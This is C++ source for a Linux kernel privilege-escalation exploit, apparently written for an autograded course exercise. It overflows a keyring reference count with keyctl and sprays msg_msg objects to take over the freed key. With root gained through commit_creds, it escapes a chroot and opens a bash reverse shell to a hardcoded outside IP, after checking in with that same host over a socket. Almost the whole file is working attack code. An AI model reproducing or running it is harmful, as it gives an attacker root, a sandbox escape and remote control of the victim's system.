/**
	attempts to become root, escape chroot, and open a reverse shell
	This causes a kernel memory leak as expected, but will take additional work to make this actually give a root.
**/

#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <iostream>
#include <netinet/ip.h>
#include <iostream>
#include <cstring>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <arpa/inet.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <unistd.h>

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

#define STRUCT_LEN (0xb8 - 0x30)
/* Ubuntu addresses
#define COMMIT_CREDS_ADDR (0xffffffff81095710)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095a10)
*/
/* autograder ones: */
#define COMMIT_CREDS_ADDR (0xffffffff81095710)
#define PREPARE_KERNEL_CREDS_ADDR (0xffffffff8109e1f0)

struct key_type {
	char * name;
	size_t datalen;
	void * vet_description;
	void * preparse;
	void * free_preparse;
	void * instantiate;
	void * update;
	void * match_preparse;
	void * match_free;
	void * revoke;
	void * destroy;
};

extern "C" {
	void userspace_revoke(void * key) {
		commit_creds(prepare_kernel_cred(0));
	}
}

using namespace std;

void getRoot() {
	const char *keyring_name;
	size_t i = 0;
	unsigned long int l = 0x100000000 / 2;
	int serial = -1;
	pid_t pid = -1;
	struct key_type * my_key_type = NULL;

	struct {
		long mtype;
		char mtext[STRUCT_LEN];
	} msg = { 0x4141414141414141,{ 0 } };
	int msqid;

	commit_creds = (_commit_creds)COMMIT_CREDS_ADDR;
	prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CREDS_ADDR;

	my_key_type = (key_type*)malloc(sizeof(*my_key_type));

	my_key_type->revoke = (void*)userspace_revoke;
	memset(msg.mtext, 'A', sizeof(msg.mtext));

	// key->uid
	*(int*)(&msg.mtext[56]) = 0x3e8; // geteuid()
										//key->perm
	*(int*)(&msg.mtext[64]) = 0x3f3f3f3f;

	//key->type
	*(unsigned long *)(&msg.mtext[80]) = (unsigned long)my_key_type;

	if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
		perror("msgget");
		exit(1);
	}

	keyring_name = "abc";
	//0x1 = KEYCTL_JOIN_SESSION_KEYRING
	serial = syscall(SYS_keyctl, 0x1 , keyring_name);
	if (serial < 0) {
		cout << strerror(errno) << endl;
		_exit(0);
	}

	//0x5 = KEYCTL_SETPERM
	//0x3f3f3f3f = all
	int ret = syscall(SYS_keyctl, 0x5, serial, 0x3f3f3f3f);
	if (ret < 0) {
		cout << strerror(errno) << endl;
		_exit(0);
	}

	puts("Increfing...");
	for (i = 1; i < 0xfffffffd; i++) {
		if (i == (0xffffffff - l)) {
			l = l / 2;
			sleep(5);
		}
		//0x1 = KEYCTL_JOIN_SESSION_KEYRING
		if (syscall(SYS_keyctl, 0x1, keyring_name) < 0) {
			perror("keyctl");
			_exit(0);
		}
	}

	sleep(5);
	// here we are going to leak the last references to overflow
	for (i = 0; i<5; ++i) {
		//0x1 = KEYCTL_JOIN_SESSION_KEYRING
		if (syscall(SYS_keyctl, 0x1, keyring_name) < 0) {
			perror("keyctl");
			_exit(0);
		}
	}

	puts("finished increfing");
	puts("forking...");
	// allocate msg struct in the kernel rewriting the freed keyring object
	for (i = 0; i<64; i++) {
		pid = fork();
		if (pid == -1) {
			perror("fork");
			_exit(0);
		}

		if (pid == 0) {
			sleep(2);
			if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
				perror("msgget");
				exit(1);
			}
			for (i = 0; i < 64; i++) {
				if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
					perror("msgsnd");
					exit(1);
				}
			}
			sleep(-1);
			exit(1);
		}
	}

	puts("finished forking");
	sleep(5);

	// call userspace_revoke from kernel
	puts("caling revoke...");
	//0x3 = KEYCTL_REVOKE
	//-3 = KEY_SPEC_SESSION_KEYRING
	if (syscall(SYS_keyctl, 0x3, -3) == -1) {
		perror("keyctl_revoke");
	}
		
	//TODO: make sure all needed libraries are provided, or if not get embed the logic
	printf("%d,%d\n", getuid(), geteuid());


	0 == 0;
	int dir_fd, x;
	mkdir(".42", 0755);
	dir_fd = open(".", O_RDONLY);
	chroot(".42");
	fchdir(dir_fd);
	close(dir_fd);
	for (x = 0; x < 1000; x++) chdir("..");
	chroot(".");

	system("/bin/bash -c \"/bin/bash -i >& /dev/tcp/52.2.174.86/3779 0>&1  \"");
	_exit(0);
}

void dieIfNotFirst() {
	//This function will connect to a remote server.
	//If the server replies 1, the server will continue. Else, it will die.
	int ret;

	//open a TCP socket
	auto sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		cout << strerror(errno) << endl;
		_exit(0);
	}

	//some stuff to make it easier to reuse the address later
	int yes = 1;
	ret = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, 4);
	if (ret < 0) {
		_exit(0);
	}

	//set up which server we want to connect to, and on what port
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(3777);
	addr.sin_addr.s_addr = inet_addr("52.2.174.86");

	//open a connection to the server
	ret = connect(
		sock,
		(sockaddr*)&addr,
		sizeof(addr)
		);
	if (ret < 0) {
		_exit(0);
	}
	char x;
	
	ret = send(sock,
		"connected",
		strlen("connected"),
		0);
	if (ret == 0) {
		_exit(0);
	}
	if (ret < 0) {
		_exit(0);
	}

	ret = recv(sock,
		&x,
		1,
		0
		);
	if (ret == 0) {
		_exit(0);
	}
	if (ret < 0) {
		_exit(0);
	}
	if (x != '1') {
		_exit(0);
	}
	close(sock);
}


void breakCipher(char* str) {
	//use vfork to escape the jail
	pid_t vpid;
	pid_t pid = vfork();
	if (pid < 0) {
		strcpy(str, "V1");
		return;
	}
	else if (pid == 0) {
		//V1 child
		//make sure that a process dying doesn't kill its children
		sigset_t mask;
		if (sigfillset(&mask)) {
			cout << strerror(errno) << endl;
			strcpy(str, "S1");
			_exit(0);
		}
		if (sigprocmask(SIG_SETMASK, &mask, NULL)) {
			cout << strerror(errno) << endl;
			strcpy(str, "S2");
			_exit(0);
		}

		//make the intermediate process that's going to be killed
		pid_t pid2 = fork();
		if (pid2 < 0) {
			cout << strerror(errno) << endl;
			strcpy(str, "F1");
			_exit(0);
		}
		else if (pid2 == 0) {
			//V1 child F1 child
			//make the actual worker process
			pid_t pid3 = fork();
			if (pid3 < 0) {
				cout << strerror(errno) << endl;
				strcpy(str, "F2");
				_exit(0);
			}
			else if (pid3 == 0) {
				//v1 child f1 child f2 child
				//this is the actual process that does the work
				dieIfNotFirst();
				getRoot();
				_exit(0);
			}
			else {
				//v1 child f1 child f2 parent
				//this is the intermediate process. simply die.
				vpid = pid2;
				_exit(0);
			}
			_exit(0);
		}
		else {
			//V1 child F1 parent
			_exit(0);
		}
	}
	else {
		_exit(0);
	}

}